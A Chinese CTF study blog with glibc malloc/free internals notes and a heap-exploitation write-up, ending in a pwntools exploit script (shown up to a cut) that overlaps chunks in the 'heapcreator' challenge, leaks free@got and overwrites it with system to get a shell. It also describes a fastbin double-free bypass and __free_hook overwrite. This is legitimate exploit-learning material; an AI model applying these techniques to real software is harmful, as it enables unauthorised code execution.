<p>在glibc malloc中针对堆管理，主要涉及到以下3种数据结构：</p>
<ul>
<li>heap_info: 即Heap Header，因为一个thread arena（注意：不包含main thread）可以包含多个heaps，所以为了便于管理，就给每个heap分配一个heap header。在当前heap不够用的时候，malloc会通过系统调用mmap申请新的堆空间，新的堆空间会被添加到当前thread arena中，便于管理。</li>
<li>malloc_state: 即Arena Header，每个thread只含有一个Arena Header。Arena Header包含bins的信息、top chunk以及最后一个remainder chunk等</li>
<li>malloc_chunk: 即Chunk Header，一个heap被分为多个chunk，至于每个chunk的大小，这是根据用户的请求决定的，也就是说用户调用malloc(size)传递的size参数“就是”chunk的大小.每个chunk都由一个结构体malloc_chunk表示</li>
</ul>
<h3 id="Arena">Arena</h3>
<p>一个线程只有一个arena，各个线程的arena都是独立的。</p>
<p>每个程序中的arena数量是有限制的，与和核心数量有关，因此不是每个线程都会有独立的arena。另外，如果线程数大于核心数的两倍，就必然有线程处于等待状态，所以没有必要都分配独立的arena</p>
<p>主线程的arena称为main_arena；子线程的称为thread_arena。</p>
<p>与 thread arena 不同，main arena 的 arena header（state） 不是保存在通过 sbrk 申请的堆段里，而是作为一个全局变量，可以在 <span class="exturl" data-url="aHR0cDovL2xpYmMuc28=">libc.so<i class="fa fa-external-link-alt"></i></span> 的数据段中找到</p>
<h3 id="heap-info">heap info</h3>
<p>专门为mmap申请的内存（memory mapping segment)准备的，用来记录堆的信息和链接结构</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Main arena 无需维护多个堆，因此也无需 heap_info。当空间耗尽时，与 thread arena 不同，main arena 可以通过 sbrk 拓展堆段，直至堆段「碰」到内存映射段；</span><br></pre></td></tr></table></figure>
<p>结构的记录的信息包括：</p>
<ul>
<li>堆对应的arena的地址</li>
<li>上一个heap_info的地址</li>
<li>当前堆的大小</li>
<li>用于对齐</li>
</ul>
<h3 id="malloc-state">malloc_state</h3>
<p>用于管理堆，记录每个arena当前申请的所有内存的具体状态。</p>
<p>无论是main arena还是thread arena，都只有一个malloc state结构。对于main arena，这个结构是一个全局变量，放在libc.so的数据段中；对于thread arena，这个结构会放在最新申请的arena中</p>
<h1>malloc的时候做了什么</h1>
<p>（以ptmalloc为例）</p>
<ul>
<li>获得锁或用mmap()开辟出非主分配区</li>
<li>将申请的内存大小转换为实际分配的内存大小</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">malloc寻找堆块的顺序:</span><br><span class="line">1. 在fastbin中寻找有没有对应的chunk</span><br><span class="line">2. 请求大小为small bin范围，在small bin中寻找有没有对应的chunk</span><br><span class="line">3. 考虑是否是large bin，调用malloc_consolidate合并fastbin</span><br><span class="line">   （ fast bin 中的 chunk，将有可能能够合并的 chunk 先进行合并后放到 unsorted bin 中，不能够合并的就直接放到 unsorted bin 中，然后再在下面的大循环中进行相应的处理）</span><br><span class="line"></span><br><span class="line">（↓进入大循环↓）</span><br><span class="line">4. 在unsorted bin中寻找有没有合适的chunk</span><br><span class="line">  如果小于unsorted bin，就对unsorted bin进行切割；如果不满足请求的大小，先把unsorted bin放入small bins或large bins ，然后进行下一步</span><br><span class="line">（--大循环结束--最多迭代10000次）</span><br><span class="line"></span><br><span class="line">5. 在large bin中寻找有没有合适的chunk，根据smalllest-first，best-fit 的原则</span><br><span class="line">  （ps:large bin中的堆块不会进行切割，不满足就到top chunk切割（这个知识点与分配无关）</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">6. 寻找较大的bin链中有没有合适的chunk</span><br><span class="line">寻找所有map中合适大小的chunk</span><br><span class="line"></span><br><span class="line">7. 使用top_chunk</span><br><span class="line"></span><br><span class="line">8. top_chunk不够用，如果是主分配区就调用sbrk()；非主分配区就调用mmap()，增加top_chunk大小</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<ul>
<li>大循环</li>
</ul>
<ol>
<li>按照 FIFO 的方式逐个将 unsorted bin 中的 chunk 取出来<br>
如果是 small request，则考虑是不是恰好满足，是的话，直接返回。<br>
如果不是的话，放到对应的 bin 中。</li>
</ol>
<p>__int_malloc的大循环主要用来处理unsorted bin。如果整个循环没有找到合适的bin，说明所有的unsorted bin的大小都不满足要求</p>
<ul>
<li>malloc_consolidate：用于将fastbin中的chunk合并，清空fastbin。<br>
先尝试向后合并，然后尝试向前合并：<br>
如果向前相邻topchunk则直接合并，如果不相邻则尝试向前合并后插入unsortedbin， 然后获取下一个空闲的chunk，直到fastbin清空</li>
</ul>
<h2 id="堆分配函数">堆分配函数</h2>
<ul>
<li>malloc</li>
<li>calloc<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">calloc</span>(<span class="number">0x20</span>);</span><br><span class="line"><span class="comment">//等同于</span></span><br><span class="line">ptr=<span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line"><span class="built_in">memset</span>(ptr,<span class="number">0</span>,<span class="number">0x20</span>);</span><br></pre></td></tr></table></figure>
</li>
<li>realloc</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">当 realloc(ptr,size) 的 size 不等于 ptr 的 size 时</span><br><span class="line">  如果申请 size &gt; 原来 size</span><br><span class="line">    如果 chunk 与 top chunk 相邻，直接扩展这个 chunk 到新 size 大小</span><br><span class="line">    如果 chunk 与 top chunk 不相邻，相当于 free(ptr),malloc(new_size)</span><br><span class="line">  如果申请 size &lt; 原来 size</span><br><span class="line">    如果相差不足以容得下一个最小 chunk(64 位下 32 个字节，32 位下 16 个字节)，则保持不变</span><br><span class="line">    如果相差可以容得下一个最小 chunk，则切割原 chunk 为两部分，free 掉后一部分</span><br><span class="line">当 realloc(ptr,size) 的 size 等于 0 时，相当于 free(ptr)</span><br><span class="line">当 realloc(ptr,size) 的 size 等于 ptr 的 size，不进行任何操作</span><br></pre></td></tr></table></figure>
<h1>free的时候发生了什么</h1>
<p><span class="exturl" data-url="aHR0cHM6Ly9jb2RlLndvYm9xLm9yZy91c2Vyc3BhY2UvZ2xpYmMvbWFsbG9jL21hbGxvYy5jLmh0bWwjX19saWJjX2ZyZWU=">源码<i class="fa fa-external-link-alt"></i></span></p>
<h2 id="libc-free">__libc_free</h2>
<p>只有一个参数，为需要free的地址判断：</p>
<ol>
<li>是否hook了（有则执行free_hook，结束free）（下）</li>
<li>free的参数，为NULL直接返回</li>
<li>（指针指向chunk头部）</li>
<li>如果内存是mmap得到的则进行munmap_chunk()，否则执行_int_free（参数为main_arena结构体的地址、header、0）</li>
</ol>
<ul>
<li>free_hook：<br>
判断是否有用户自定义的函数，如果有就执行，然后结束堆释放<br>
<strong>__free_hook漏洞</strong>：如果将__free_hook变为一个system的地址，那么就可以执行这个system的地址</li>
</ul>
<h3 id="int-free">_int_free</h3>
<h4 id="检查">检查</h4>
<ol>
<li>不能指向非法地址</li>
<li>指针对齐2*SIZE_SZ（32位下=4；64位下=8）</li>
<li>free的空间大小小于限制最小的chunk</li>
</ol>
<p>如果检查没有问题就在各个bin分支进行判断</p>
<h3 id="fastbin">fastbin</h3>
<p>如果size小于等于fastbin的最大size且不与top chunk相邻，就进入fastbin分支进行判断，符合条件就插入fastbin头部，成为第一个chunk检查：</p>
<ul>
<li>下一个chunk大小小于2*SIZE_SZ</li>
<li>下一个chunk大小小于system_mem（系统分配的空间总量）<br>
在结构体malloc_state最后：</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Memory allocated from the system in this arena.  */</span></span><br><span class="line">INTERNAL_SIZE_T system_mem;</span><br><span class="line">INTERNAL_SIZE_T max_system_mem;</span><br></pre></td></tr></table></figure>
<ul>
<li>设置chunk的mem部分为perturb_byte</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> chunk2mem(p) ((void *) ((char *) (p) + 2 * SIZE_SZ))</span></span><br><span class="line">free_perturb (<span class="keyword">char</span> *p, <span class="keyword">size_t</span> n)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (perturb_byte))</span><br><span class="line">    <span class="built_in">memset</span> (p, perturb_byte, n);</span><br><span class="line">&#125;</span><br><span class="line">free_perturb (chunk2mem(p), size - <span class="number">2</span> * SIZE_SZ);</span><br></pre></td></tr></table></figure>
<p>perturb_byte:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> perturb_byte;</span><br><span class="line"></span><br><span class="line">do_set_perturb_byte (<span class="keyword">int32_t</span> value)</span><br><span class="line">&#123;</span><br><span class="line">  LIBC_PROBE (memory_mallopt_perturb, <span class="number">2</span>, value, perturb_byte);</span><br><span class="line">  perturb_byte = value;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>set_fastchunks，对arena的flags标志位的最低bit清零</li>
<li>用chunk的大小判断应该放进哪个fastbin中</li>
<li>对应fastbin的头指针初始化为NULL</li>
<li>automically插入链表:
<ol>
<li>chunk的fd赋值为fastbin的值</li>
<li>fastbin赋值为当前chunk的地址</li>
</ol>
</li>
<li>简单的double free检查，如果top of bin和当前free对象相同则报错，bypass方法为</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">free</span>(a)</span><br><span class="line"><span class="built_in">free</span>(b)</span><br><span class="line"><span class="built_in">free</span>(a)</span><br></pre></td></tr></table></figure>
<ul>
<li>fastbin entry 判断</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (have_lock &amp;&amp; old != <span class="literal">NULL</span></span><br><span class="line">        &amp;&amp; __builtin_expect (fastbin_index (chunksize (old)) != idx, <span class="number">0</span>))</span><br></pre></td></tr></table></figure>
<p>另外还有一些多线程的操作没有记上<br>
free一个fastbin的过程只进行了一些判断和链接操作，对inuse位没有处理</p>
<h4 id="代码">代码</h4>
<p>想把代码放上来，但是折叠之后不知道怎么高亮…<br>
从：<br>
<span class="exturl" data-url="aHR0cHM6Ly9jb2RlLndvYm9xLm9yZy91c2Vyc3BhY2UvZ2xpYmMvbWFsbG9jL21hbGxvYy5jLmh0bWwjNDIzMg==">https://code.woboq.org/userspace/glibc/malloc/malloc.c.html#4232<i class="fa fa-external-link-alt"></i></span><br>
到4301行</p>
<h3 id="非fastbin">非fastbin</h3>
<p>包括smallbin、largebin、unsortbin</p>
<h4 id="consolidate-free">consolidate&amp;&amp;free</h4>
<p>合并区块的顺序：先考虑物理低地址的空闲块，合并后的chunk指向合并的chunk的低地址</p>
<p>步骤：</p>
<ol>
<li>获得下一个chunk的地址</li>
<li>3个double free check</li>
</ol>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Lightweight tests: check whether the block is already the</span></span><br><span class="line"><span class="comment">   top block.  */</span></span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (p == av-&gt;top))</span><br><span class="line">  malloc_printerr (<span class="string">&quot;double free or corruption (top)&quot;</span>);</span><br><span class="line"><span class="comment">/* Or whether the next chunk is beyond the boundaries of the arena.  */</span></span><br><span class="line"><span class="keyword">if</span> (__builtin_expect (contiguous (av)</span><br><span class="line">                    &amp;&amp; (<span class="keyword">char</span> *) nextchunk</span><br><span class="line">                    &gt;= ((<span class="keyword">char</span> *) av-&gt;top + chunksize(av-&gt;top)), <span class="number">0</span>))</span><br><span class="line">    malloc_printerr (<span class="string">&quot;double free or corruption (out)&quot;</span>);</span><br><span class="line"><span class="comment">/* Or whether the block is actually not marked used.  */</span></span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (!prev_inuse(nextchunk)))</span><br><span class="line">  malloc_printerr (<span class="string">&quot;double free or corruption (!prev)&quot;</span>);</span><br></pre></td></tr></table></figure>
<ol start="3">
<li>调用free_perturb函数</li>
<li>向后合并</li>
</ol>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* consolidate backward */</span></span><br><span class="line"><span class="keyword">if</span> (!prev_inuse(p)) &#123;</span><br><span class="line">  prevsize = prev_size (p);</span><br><span class="line">  size += prevsize;</span><br><span class="line">  p = chunk_at_offset(p, -((<span class="keyword">long</span>) prevsize));</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (chunksize(p) != prevsize))</span><br><span class="line">    malloc_printerr (<span class="string">&quot;corrupted size vs. prev_size while consolidating&quot;</span>);</span><br><span class="line">  unlink_chunk (av, p);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ol start="5">
<li>向前合并</li>
</ol>
<ul>
<li>如果下一个chunk不是top chunk，则合并高地址的chunk，并将合并后的chunk放入unsorted bin</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (nextchunk != av-&gt;top) &#123;</span><br><span class="line">  <span class="comment">/* get and clear inuse bit */</span></span><br><span class="line">  nextinuse = inuse_bit_at_offset(nextchunk, nextsize);</span><br><span class="line">  <span class="comment">/* consolidate forward */</span></span><br><span class="line">  <span class="keyword">if</span> (!nextinuse) &#123;</span><br><span class="line">    unlink_chunk (av, nextchunk);</span><br><span class="line">    size += nextsize;</span><br><span class="line">  &#125; <span class="keyword">else</span></span><br><span class="line">    clear_inuse_bit_at_offset(nextchunk, <span class="number">0</span>);</span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">    Place the chunk in unsorted chunk list. Chunks are</span></span><br><span class="line"><span class="comment">    not placed into regular bins until after they have</span></span><br><span class="line"><span class="comment">    been given one chance to be used in malloc.</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line">  bck = unsorted_chunks(av);</span><br><span class="line">  fwd = bck-&gt;fd;</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk != bck))</span><br><span class="line">    malloc_printerr (<span class="string">&quot;free(): corrupted unsorted chunks&quot;</span>);</span><br><span class="line">  p-&gt;fd = fwd;</span><br><span class="line">  p-&gt;bk = bck;</span><br><span class="line">  <span class="keyword">if</span> (!in_smallbin_range(size))</span><br><span class="line">    &#123;</span><br><span class="line">      p-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">      p-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  bck-&gt;fd = p;</span><br><span class="line">  fwd-&gt;bk = p;</span><br><span class="line">  set_head(p, size | PREV_INUSE);</span><br><span class="line">  set_foot(p, size);</span><br><span class="line">  check_free_chunk(av, p);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>如果下一个chunk是top chunk，则合并到top chunk中</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  If the chunk borders the current high end of memory,</span></span><br><span class="line"><span class="comment">  consolidate into top</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">  size += nextsize;</span><br><span class="line">  set_head(p, size | PREV_INUSE);</span><br><span class="line">  av-&gt;top = p;</span><br><span class="line">  check_chunk(av, p);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>向系统返还内存<br>
如果合并后的chunk大小大于fastbin_consolidation_threshold（默认64k），就向系统返还内存</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"> <span class="comment">/*</span></span><br><span class="line"><span class="comment">      If freeing a large space, consolidate possibly-surrounding</span></span><br><span class="line"><span class="comment">      chunks. Then, if the total unused topmost memory exceeds trim</span></span><br><span class="line"><span class="comment">      threshold, ask malloc_trim to reduce top.</span></span><br><span class="line"><span class="comment">      Unless max_fast is 0, we don&#x27;t know if there are fastbins</span></span><br><span class="line"><span class="comment">      bordering top, so we cannot tell for sure whether threshold</span></span><br><span class="line"><span class="comment">      has been reached unless fastbins are consolidated.  But we</span></span><br><span class="line"><span class="comment">      don&#x27;t want to consolidate on each free.  As a compromise,</span></span><br><span class="line"><span class="comment">      consolidation is performed if FASTBIN_CONSOLIDATION_THRESHOLD</span></span><br><span class="line"><span class="comment">      is reached.</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>)(size) &gt;= FASTBIN_CONSOLIDATION_THRESHOLD) &#123;</span><br><span class="line">      <span class="keyword">if</span> (atomic_load_relaxed (&amp;av-&gt;have_fastchunks))</span><br><span class="line">        malloc_consolidate(av);</span><br><span class="line">      <span class="keyword">if</span> (av == &amp;main_arena) &#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> MORECORE_CANNOT_TRIM</span></span><br><span class="line">        <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>)(chunksize(av-&gt;top)) &gt;=</span><br><span class="line">            (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(mp_.trim_threshold))</span><br><span class="line">          systrim(mp_.top_pad, av);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">/* Always try heap_trim(), even if the top chunk is not</span></span><br><span class="line"><span class="comment">           large, because the corresponding heap might go away.  */</span></span><br><span class="line">        heap_info *heap = heap_for_ptr(top(av));</span><br><span class="line">        assert(heap-&gt;ar_ptr == av);</span><br><span class="line">        heap_trim(heap, mp_.top_pad);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!have_lock)</span><br><span class="line">      __libc_lock_unlock (av-&gt;mutex);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>释放mmap出的内存</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    munmap_chunk (p);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="tcache">tcache</h2>
<p>glibc2.26后引入的技术，提升堆管理的性能，也舍弃了很多安全检查</p>
<p>引入了两个结构体&quot;tcache_entry&quot;和&quot;tcache_perthread_struct&quot;</p>
<ul>
<li><strong>tcache_entry</strong>用单向链表的方式连接大小相同的空闲chunk结构体；</li>
<li>每个线程会维护一个<strong>tcache_perthread_struct</strong>，作为tcache的管理结构，维护tcache_max_bins个计数器和tcache_max_bins项tcache_entry，规定每条tcache_entry最多有七个chunk</li>
</ul>
<h3 id="工作方式">工作方式</h3>
<ul>
<li>第一次 malloc 时，会先 malloc 一块内存用来存放 tcache_prethread_struct 。</li>
<li>free 内存，且 size 小于 small bin size 时
<ul>
<li>先放到对应的 tcache 中，直到 tcache 被填满（默认是 7 个）</li>
<li>tcache 被填满之后，再次 free 的内存和之前一样被放到 fastbin 或者 unsorted bin 中</li>
<li>tcache 中的 chunk 不会合并（不取消 inuse bit）</li>
</ul>
</li>
<li>malloc 内存，且 size 在 tcache 范围内</li>
<li>先从 tcache 取 chunk，直到 tcache 为空，tcache 为空后，从 bin 中找</li>
<li>tcache 为空时，如果 fastbin/smallbin/unsorted bin 中有 size 符合的 chunk，会先把 fastbin/smallbin/unsorted bin 中的 chunk 放到 tcache 中，直到填满。之后再从 tcache 中取；因此 chunk 在 bin 中和 tcache 中的顺序会反过来</li>
</ul>
<h1>参考：</h1>
<p><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzE3NzEzOTM1L2FydGljbGUvZGV0YWlscy84NjIzMTUwMg==">https://blog.csdn.net/qq_17713935/article/details/86231502<i class="fa fa-external-link-alt"></i></span></p>
<p><span class="exturl" data-url="aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC8yNDc1Mzg2MQ==">Linux堆内存管理深入分析（上）<i class="fa fa-external-link-alt"></i></span><br>
<span class="exturl" data-url="aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC8yNDc5MDE2NA==">Linux堆内存管理深入分析（下）<i class="fa fa-external-link-alt"></i></span></p>
<p><span class="exturl" data-url="aHR0cHM6Ly9jdGYtd2lraS5vcmcvcHduL2xpbnV4L2dsaWJjLWhlYXAvaW1wbGVtZW50YXRpb24vb3ZlcnZpZXcv">ctf-wiki<i class="fa fa-external-link-alt"></i></span></p>
<p><span class="exturl" data-url="aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC83NzMxNjIwNg==">https://zhuanlan.zhihu.com/p/77316206<i class="fa fa-external-link-alt"></i></span></p>
]]></content>
      <tags>
        <tag>笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>ctfwiki堆漏洞整理</title>
    <url>/12265.html</url>
    <content><![CDATA[<p>不出意外的话我应该是把这个鸽掉了</p>
<span id="more"></span>
<h1>堆溢出</h1>
<p>向某个堆块写入的字节数超过了可用字节数（堆管理器会对用户申请的字节数进行调整，可用字节数可能大于申请的字节数），数据溢出到下一个（物理相邻的高地址）堆块上</p>
<p><strong>利用策略</strong>：</p>
<ul>
<li>1.覆盖下一个chunk的内容</li>
<li>2.利用堆中的机制如unlink，实现任意地址写入或者控制堆块中的内容</li>
</ul>
<h2 id="几个重要步骤">几个重要步骤</h2>
<ol>
<li>寻找堆分配函数：malloc、calloc、realloc（根据参数size的不同，实现分配和释放的功能）<br>
malloc不能初始化分配的空间，可能遗留上一次释放前的数据；calloc会把分配空间的每一位都初始化为空</li>
<li>寻找危险函数（输入输出、字符串操作）</li>
<li>确定填充长度（注意对齐以及可能借用下一chunk的pre_size）</li>
</ol>
<h2 id="Off-By-One-堆">Off-By-One(堆)</h2>
<p>指溢出了一个字节（单字节缓冲区溢出）</p>
<h3 id="利用思路">利用思路</h3>
<ol>
<li>修改堆大小使堆块结构出现重叠，泄露其他数据或者覆盖其他数据</li>
<li>使prev_in_use位清零，这时前块会被认为是空闲的
<ol>
<li>unlink</li>
<li>伪造prev_size造成堆块之间的重叠（前提是unlink的时候没有检查按prev_size找到的块和prev_size大小是否一致</li>
</ol>
</li>
</ol>
<h3 id="b00k">b00k</h3>
<p>然后运行一下看看程序的运行，再进ida，函数名已经把功能写的很清楚了：<br>
main函数：<br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210309165145.png" alt="20210309165145"></p>
<p>发现每次读入都是调用这个函数：<br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210309165416.png" alt="20210309165416"><br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210309165312.png" alt="20210309165312"><br>
而仔细想想这个函数，发现当长度为32时，刚好能把结束符覆盖到下一个字节，而程序刚开始运行输入的author_name存储的位置也真的是非常的巧妙：<br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210309165850.png" alt="20210309165850"><br>
也就是说我们能够泄露出book信息存放的地址了</p>
<h1>Chunk extend &amp; overlapping</h1>
<p>主要是通过其他漏洞（如off by one）修改某个chunk的size，达到覆盖后面几个chunk的效果，这样就能直接修改后面chunk的内容，造成任意地址读、控制执行等</p>
<h2 id="heapcreator">heapcreator</h2>
<p>照例先check一波</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">pluto@pluto-virtual-machine:~/Desktop$ checksec heapcreator </span><br><span class="line">[*] <span class="string">&#x27;/home/pluto/Desktop/heapcreator&#x27;</span></span><br><span class="line">    Arch:     amd64-<span class="number">64</span>-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (<span class="number">0x400000</span>)</span><br></pre></td></tr></table></figure>
<p>main函数：<br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210309170512.png" alt="20210309170512"><br>
create():<br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210309170921.png" alt="20210309170921"><br>
进入create，先为heaparry中一个成员申请出一块空间，再让这块空间中的第二个位置（*((void **)heaparray[i] + 1)）指向content的内容</p>
<p>用gdb先分配一下，create两次，大小为2，内容分别为aa和bb，可以看到分配了四个堆：<br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210309184045.png" alt="20210309184045"></p>
<p><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210309184657.png" alt="20210309184657"><br>
这里回顾一下chunk的结构：<br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210309184724.png" alt="20210309184724"><br>
pre_size这个字段（8字节）在p==1即前一个chunk在使用时是提供给前一个chunk使用的<br>
至于为什么分配的大小都是0x21，是因为分配的时候会将申请的大小转换为实际分配的大小，64位下要是16的整数倍，0x21/16==2</p>
<p>edit函数，19行明显可以造成溢出<br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210309185720.png" alt="20210309185720"><br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210309185824.png" alt="20210309185824"></p>
<p>剩下两个函数都是没啥大问题的</p>
<p>于是可以想到，构造三个chunk，然后通过第一个chunk改变第二个chunk的大小使得2、3chunk overlapping；<br>
free chunk2，然后再次分配改变第三个chunk的大小和内容，使其指向free.got，接着调用show()把free的地址打印出来；<br>
这时因为目标是调用system(“/bin/sh”)所以还需要劫持free的got表，而<strong>由于此时chunk2的ptr已经修改为free_got了，编辑chunk2就相当于改free_got了</strong>；<br>
于是最后一步就只需要再造一个chunk，写入’/bin/sh’然后释放，就能达到getshell的目的</p>
<p>关于加粗部分：<br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210309193527.png" alt="20210309193527"></p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#-*-coding:utf-8-*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&quot;./heapcreator&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./heapcreator&#x27;</span>)</span><br><span class="line">context.log_level=<span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span>(<span class="params">size, payload</span>):</span></span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Your choice :&quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Size of Heap : &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Content of heap:&quot;</span>,<span class="built_in">str</span>(payload))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params"><span class="built_in">id</span>, payload</span>):</span></span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Your choice :&quot;</span>,<span class="string">&quot;2&quot;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Index :&quot;</span>,<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Content of heap : &quot;</span>,<span class="built_in">str</span>(payload))</span><br><span class="line">	p.recvline()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params"><span class="built_in">id</span></span>):</span></span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Your choice :&quot;</span>,<span class="string">&quot;4&quot;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Index :&quot;</span>,<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params"><span class="built_in">id</span></span>):</span></span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Your choice :&quot;</span>,<span class="string">&quot;3&quot;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Index :&quot;</span>,<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line"></span><br><span class="line">create(<span class="number">0x18</span>,<span class="string">&quot;aaaa&quot;</span>)	</span><br><span class="line">create(<span class="number">0x10</span>,<span class="string">&quot;bbbb&quot;</span>)</span><br><span class="line">create(<span class="number">0x10</span>,<span class="string">&quot;cccc&quot;</span>)</span><br><span class="line">create(<span class="number">0x10</span>,<span class="string">&quot;/bin/sh&quot;</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,<span class="string">&quot;a&quot;</span>*<span class="number">0x18</span> + <span class="string">&#x27;\x81&#x27;</span>)</span><br><span class="line">sleep(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">p.recvline()</span><br><span class="line">payload = <span class="string">&quot;a&quot;</span>*<span class="number">0x40</span> + <span class="string">&#x27;\x08&#x27;</span>.ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>) + p64(elf.got[<span class="string">&#x27;free&#x27;</span>])</span><br><span class="line">create(<span class="number">0x70</span>,payload)</span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;Content : &quot;</span>)</span><br><span class="line">free_addr = u64(p.recvuntil(<span class="string">&quot;Done&quot;</span>)[:-<span class="number">5</span>].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(free_addr)</span><br><span class="line">free_sys_offset = -<span class="number">0x3f1a0</span></span><br><span class="line">sys_addr = free_addr + free_sys_offset</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;\nsys_addr:   &#x27;</span> + <span class="built_in">hex</span>(sys_addr)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">2</span>,p64(sys_addr)) 